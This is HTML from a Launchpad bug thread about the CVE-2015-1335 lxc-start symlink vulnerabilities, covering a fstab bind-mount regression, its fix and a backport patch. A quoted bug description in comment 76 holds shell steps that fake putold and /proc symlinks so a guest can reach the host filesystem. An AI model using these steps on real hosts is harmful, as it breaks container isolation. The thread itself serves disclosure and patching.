          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/68" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~3-stephen" class="sprite person">Stephen Gaito (3-stephen)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T09:56:35.601801+00:00" title="2015-09-30 09:56:35 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/68"> #68</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Looking through the top Google results on how to bind-mount a directory from the host-server into the lxc-server I notice that:</p>
<p>* Stéphane Graber&#x27;s &quot;LXC 1.0: Advanced container usage [3/10]&quot; post ( <a rel="nofollow" href="https://www.stgraber.org/2013/12/21/lxc-1-0-advanced-container-usage/">https:/<wbr />/www.stgraber.<wbr />org/2013/<wbr />12/21/lxc-<wbr />1-0-advanced-<wbr />container-<wbr />usage/</a> ) makes use of the **relative** mount point (in the lxc-server&#x27;s fstab config file on the host-server)</p>
<p>* Unfortunately the **official**(?) Debian LXC wiki page on &quot;LXC&quot; has the topic &quot;Bind mounts inside the container&quot; ( <a rel="nofollow" href="https://wiki.debian.org/LXC#Bind_mounts_inside_the_container">https:/<wbr />/wiki.debian.<wbr />org/LXC#<wbr />Bind_mounts_<wbr />inside_<wbr />the_container</a> ) which uses the lxc.mount.entry line in the config file **and** makes use of an **absolute** mount point.</p>
<p>So those following the official Debian LXC documentation will be caught by this security patch. ;-(</p>
<p>Just to be definite: changing all lxc.mount.entry mount points to **relative** paths is a current workaround.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Looking through the top Google results on how to bind-mount a directory from the host-server into the lxc-server I notice that:

* Stéphane Graber's "LXC 1.0: Advanced container usage [3/10]" post ( https://www.stgraber.org/2013/12/21/lxc-1-0-advanced-container-usage/ ) makes use of the **relative** mount point (in the lxc-server's fstab config file on the host-server)

* Unfortunately the **official**(?) Debian LXC wiki page on "LXC" has the topic "Bind mounts inside the container" ( https://wiki.debian.org/LXC#Bind_mounts_inside_the_container ) which uses the lxc.mount.entry line in the config file **and** makes use of an **absolute** mount point.

So those following the official Debian LXC documentation will be caught by this security patch. ;-(

Just to be definite: changing all lxc.mount.entry mount points to **relative** paths is a current workaround.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/69" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~m-luescher" class="sprite person">Matthias Lüscher (m-luescher)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T13:06:07.514204+00:00" title="2015-09-30 13:06:07 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/69"> #69</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Stephen Gaito and @Roman Fiedler:</p>
<p>Thanks for your hints!  Using **relative** paths definitely helps also within the container fstab file.<br />
However it would be very helpful if lxc would accept the absolute paths again:</p>
<p>fstab that fails with 1.0.7-0ubuntu0.5:</p>
<p>/home/MYUSER/<wbr />somemountpoint /var/lib/<wbr />lxc/CONTAINERNA<wbr />ME/rootfs/<wbr />home/MYUSER none defaults,bind 0 0</p>
<p>fstab that works with 1.0.7-0ubuntu0.5:</p>
<p>/home/MYUSER/<wbr />somemountpoint home/MYUSER none defaults,bind 0 0</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Stephen Gaito and @Roman Fiedler:

Thanks for your hints!  Using **relative** paths definitely helps also within the container fstab file.
However it would be very helpful if lxc would accept the absolute paths again:

fstab that fails with 1.0.7-0ubuntu0.5:

/home/MYUSER/somemountpoint /var/lib/lxc/CONTAINERNAME/rootfs/home/MYUSER none defaults,bind 0 0

fstab that works with 1.0.7-0ubuntu0.5:

/home/MYUSER/somemountpoint home/MYUSER none defaults,bind 0 0</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/70" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T13:59:42.544613+00:00" title="2015-09-30 13:59:42 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/70"> #70</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m not so deep in LXC to know how the design/<wbr />specification is done for that. Discussion of &quot;features&quot; might therefore suite the lxc-users mailing list better.</p>
<p>The other thing is, if Ubuntu would treat that part of new behaviour of LXC affecting some users as &quot;regression&quot; and hence might act on that. I do not know, who would be up to decide that. Perhaps someone from Ubuntu could comment on that.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm not so deep in LXC to know how the design/specification is done for that. Discussion of "features" might therefore suite the lxc-users mailing list better.

The other thing is, if Ubuntu would treat that part of new behaviour of LXC affecting some users as "regression" and hence might act on that. I do not know, who would be up to decide that. Perhaps someone from Ubuntu could comment on that.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/71" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T15:00:24.334646+00:00" title="2015-09-30 15:00:24 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/71"> #71</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Relative paths are definately recommended over absolute paths, but the breaking of absolute paths will be fixed.</p>
<p>Can anyone who&#x27;s having trouble who is not on trusty please comment?  I&#x27;d like to make sure that is the only problem.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Relative paths are definately recommended over absolute paths, but the breaking of absolute paths will be fixed.

Can anyone who's having trouble who is not on trusty please comment?  I'd like to make sure that is the only problem.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/72" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T15:01:00.429595+00:00" title="2015-09-30 15:01:00 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/72"> #72</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hello - Is anyone seeing this regression on a release other than 14.04 LTS (Trusty)?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hello - Is anyone seeing this regression on a release other than 14.04 LTS (Trusty)?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/73" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T18:43:22.232103+00:00" title="2015-09-30 18:43:22 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/73"> #73</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The regression should be fixed with lxc 1.0.7-0ubuntu0.6. See <a rel="nofollow" href="http://www.ubuntu.com/usn/usn-2753-2/">http://<wbr />www.ubuntu.<wbr />com/usn/<wbr />usn-2753-<wbr />2/</a> for more details.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The regression should be fixed with lxc 1.0.7-0ubuntu0.6. See http://www.ubuntu.com/usn/usn-2753-2/ for more details.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/74" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~daniel-kraft" class="sprite person">Daniel Kraft (daniel-kraft)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-10-01T09:20:19.933378+00:00" title="2015-10-01 09:20:19 UTC">on 2015-10-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/74"> #74</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Regression fix fixes it on 14.04 LTS. Confirmed. Thanks!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Regression fix fixes it on 14.04 LTS. Confirmed. Thanks!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/75" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sunweaver" class="sprite person">Mike Gabriel (sunweaver)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-12-04T15:31:59.694019+00:00" title="2015-12-04 15:31:59 UTC">on 2015-12-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/75"> #75</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4529631/+files/CVE-2015-1335.patch">Backport fix for CVE-2015-1335 to LXC 0.7.x (Ubuntu 12.04 / Debian squeeze-lts)</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4529631">Edit</a>
        (9.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi all,</p>
<p>today I worked on backporting available fixes for CVE-2015-1335 to LXC 0.7.x (as found in Debian squeeze-lts).</p>
<p>The patch is attached, I am still in the testing-<wbr />for-regressions phase. Can any of the LXC devs take a look at the patch and maybe see if it is suitable for Ubuntu 12.04, as well?</p>
<p>Greets,<br />
Mike (aka sunweaver at debian.org)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi all,

today I worked on backporting available fixes for CVE-2015-1335 to LXC 0.7.x (as found in Debian squeeze-lts).

The patch is attached, I am still in the testing-for-regressions phase. Can any of the LXC devs take a look at the patch and maybe see if it is suitable for Ubuntu 12.04, as well?

Greets,
Mike (aka sunweaver at debian.org)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/76" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-12-08T16:08:58+00:00" title="2015-12-08 16:08:58 UTC">on 2015-12-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/76"> #76</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quoting Mike Gabriel (&lt;email address hidden&gt;):<br />
<span class="foldable-quoted">
&gt; Hi all,<br />
&gt;<br />
&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC<br />
&gt; 0.7.x (as found in Debian squeeze-lts).<br />
&gt;<br />
&gt; The patch is attached, I am still in the testing-<wbr />for-regressions phase.<br />
&gt; Can any of the LXC devs take a look at the patch and maybe see if it is<br />
&gt; suitable for Ubuntu 12.04, as well?
</span></p>
<p>Hi,</p>
<p>So the thing to look for is any unconverted &quot;mount&quot; calls.  It<br />
looks like the lxc_setup_fs() calls to mount_fs() are not being<br />
protected.  So the contianer admin could attack through a /proc<br />
symlink.</p>
<p><span class="foldable-quoted">&gt; Greets,<br />
&gt; Mike (aka sunweaver at debian.org)<br />
&gt;<br />
&gt; ** Patch added: &quot;Backport fix for CVE-2015-1335 to LXC 0.7.x (Ubuntu 12.04 / Debian squeeze-lts)&quot;<br />
&gt;    <a rel="nofollow" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4529631/+files/CVE-2015-1335.patch">https:/<wbr />/bugs.launchpad<wbr />.net/ubuntu/<wbr />+source/<wbr />lxc/+bug/<wbr />1476662/<wbr />+attachment/<wbr />4529631/<wbr />+files/<wbr />CVE-2015-<wbr />1335.patch</a><br />
&gt;<br />
&gt; --<br />
&gt; You received this bug notification because you are subscribed to the bug<br />
&gt; report.<br />
&gt; Matching subscriptions: lxc<br />
&gt; <a rel="nofollow" href="https://bugs.launchpad.net/bugs/1476662">https:/<wbr />/bugs.launchpad<wbr />.net/bugs/<wbr />1476662</a><br />
&gt;<br />
&gt; Title:<br />
&gt;   lxc-start symlink vulnerabilities may allow guest to read host<br />
&gt;   filesystem, interfere with apparmor<br />
&gt;<br />
&gt; Status in lxc package in Ubuntu:<br />
&gt;   Fix Released<br />
&gt;<br />
&gt; Bug description:<br />
&gt;   lxc-start shuffles around mounts using helper directory<br />
&gt;   /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc (guest root fs is mounted here)<br />
&gt;<br />
&gt;   It then modifies mounts operating in guest root directory before<br />
&gt;   invoking init. As it does not check if all mount points are<br />
&gt;   directories, a malicious guest may modify its internal structure<br />
&gt;   before shutdown (or was created using manipulated image) and then when<br />
&gt;   started again, guest may<br />
&gt;<br />
&gt;   * Access  the whole host root filesystem<br />
&gt;<br />
&gt;   * Block switching from lxc-start apparmor profile to lxc-container-<br />
&gt;   default<br />
&gt;<br />
&gt;<br />
&gt;   # Real putold before pivot-root (root fs will end here)<br />
&gt;   mkdir -p /x/lxc_putold<br />
&gt;<br />
&gt;   # Faked putold<br />
&gt;   ln -s /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold lxc_putold<br />
&gt;   mkdir -p /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold/<wbr />proc<br />
&gt;   touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold/<wbr />proc/mounts<br />
&gt;<br />
&gt;<br />
&gt;   # proc fake<br />
&gt;   mkdir -p /x/proc<br />
&gt;   umount /proc<br />
&gt;   rmdir /proc<br />
&gt;   ln -s /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc proc<br />
&gt;<br />
&gt;   mkdir -p /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />1/attr /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />self<br />
&gt;   touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />1/attr/<wbr />current<br />
&gt;   touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />self/status<br />
&gt;<br />
&gt;<br />
&gt;   The  issue was also found during<br />
&gt;   <a rel="nofollow" href="https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html">https:/<wbr />/service.<wbr />ait.ac.<wbr />at/security/<wbr />2015/LxcSecurit<wbr />yAnalysis.<wbr />html</a><br />
&gt;<br />
&gt; To manage notifications about this bug go to:<br />
&gt; <a rel="nofollow" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+subscriptions">https:/<wbr />/bugs.launchpad<wbr />.net/ubuntu/<wbr />+source/<wbr />lxc/+bug/<wbr />1476662/<wbr />+subscriptions</a>
</span></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quoting Mike Gabriel (mike.gabriel@das-netzwerkteam.de):
&gt; Hi all,
&gt; 
&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC
&gt; 0.7.x (as found in Debian squeeze-lts).
&gt; 
&gt; The patch is attached, I am still in the testing-for-regressions phase.
&gt; Can any of the LXC devs take a look at the patch and maybe see if it is
&gt; suitable for Ubuntu 12.04, as well?

Hi,

So the thing to look for is any unconverted "mount" calls.  It
looks like the lxc_setup_fs() calls to mount_fs() are not being
protected.  So the contianer admin could attack through a /proc
symlink.

&gt; Greets,
&gt; Mike (aka sunweaver at debian.org)
&gt; 
&gt; ** Patch added: "Backport fix for CVE-2015-1335 to LXC 0.7.x (Ubuntu 12.04 / Debian squeeze-lts)"
&gt;    https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4529631/+files/CVE-2015-1335.patch
&gt; 
&gt; -- 
&gt; You received this bug notification because you are subscribed to the bug
&gt; report.
&gt; Matching subscriptions: lxc
&gt; https://bugs.launchpad.net/bugs/1476662
&gt; 
&gt; Title:
&gt;   lxc-start symlink vulnerabilities may allow guest to read host
&gt;   filesystem, interfere with apparmor
&gt; 
&gt; Status in lxc package in Ubuntu:
&gt;   Fix Released
&gt; 
&gt; Bug description:
&gt;   lxc-start shuffles around mounts using helper directory
&gt;   /usr/lib/x86_64-linux-gnu/lxc (guest root fs is mounted here)
&gt; 
&gt;   It then modifies mounts operating in guest root directory before
&gt;   invoking init. As it does not check if all mount points are
&gt;   directories, a malicious guest may modify its internal structure
&gt;   before shutdown (or was created using manipulated image) and then when
&gt;   started again, guest may
&gt; 
&gt;   * Access  the whole host root filesystem
&gt; 
&gt;   * Block switching from lxc-start apparmor profile to lxc-container-
&gt;   default
&gt; 
&gt;   
&gt;   # Real putold before pivot-root (root fs will end here)
&gt;   mkdir -p /x/lxc_putold
&gt; 
&gt;   # Faked putold
&gt;   ln -s /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold lxc_putold
&gt;   mkdir -p /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold/proc
&gt;   touch /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold/proc/mounts
&gt; 
&gt;   
&gt;   # proc fake
&gt;   mkdir -p /x/proc
&gt;   umount /proc
&gt;   rmdir /proc
&gt;   ln -s /usr/lib/x86_64-linux-gnu/lxc/x/proc proc
&gt; 
&gt;   mkdir -p /usr/lib/x86_64-linux-gnu/lxc/x/proc/1/attr /usr/lib/x86_64-linux-gnu/lxc/x/proc/self
&gt;   touch /usr/lib/x86_64-linux-gnu/lxc/x/proc/1/attr/current
&gt;   touch /usr/lib/x86_64-linux-gnu/lxc/x/proc/self/status
&gt; 
&gt; 
&gt;   The  issue was also found during
&gt;   https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html
&gt; 
&gt; To manage notifications about this bug go to:
&gt; https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+subscriptions
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/77" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sunweaver" class="sprite person">Mike Gabriel (sunweaver)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-01-04T08:44:31+00:00" title="2016-01-04 08:44:31 UTC">on 2016-01-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/77"> #77</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

